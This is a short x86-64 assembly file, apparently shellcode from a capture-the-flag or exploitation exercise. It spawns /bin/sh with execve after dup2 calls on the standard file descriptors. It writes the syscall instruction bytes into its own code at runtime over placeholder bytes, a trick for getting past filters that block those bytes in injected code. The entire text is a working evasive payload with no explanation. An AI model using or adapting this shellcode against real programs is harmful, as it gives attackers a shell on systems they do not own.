.global _start
.intel_syntax noprefix
_start:
    # Dup2 stdin, stdout, stderr to the existing fds 0,1,2
    # This ensures the shell has proper I/O
    mov rax, 33   # dup2 syscall
    mov rdi, 0    # oldfd = 0 (stdin)
    mov rsi, 0    # newfd = 0
    mov byte ptr [rip + sys1], 0x0f
    mov byte ptr [rip + sys1+1], 0x05
sys1:
    .byte 0x0e, 0x04
    
    mov rax, 33   # dup2
    mov rdi, 1    # stdout
    mov rsi, 1
    mov byte ptr [rip + sys2], 0x0f
    mov byte ptr [rip + sys2+1], 0x05
sys2:
    .byte 0x0e, 0x04
    
    mov rax, 33   # dup2  
    mov rdi, 2    # stderr
    mov rsi, 2
    mov byte ptr [rip + sys3], 0x0f
    mov byte ptr [rip + sys3+1], 0x05
sys3:
    .byte 0x0e, 0x04
    
    # Now execve
    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi, 0
    mov rdx, 0
    mov byte ptr [rip + sys4], 0x0f
    mov byte ptr [rip + sys4+1], 0x05
sys4:
    .byte 0x0e, 0x04

binsh:
    .string "/bin/sh"
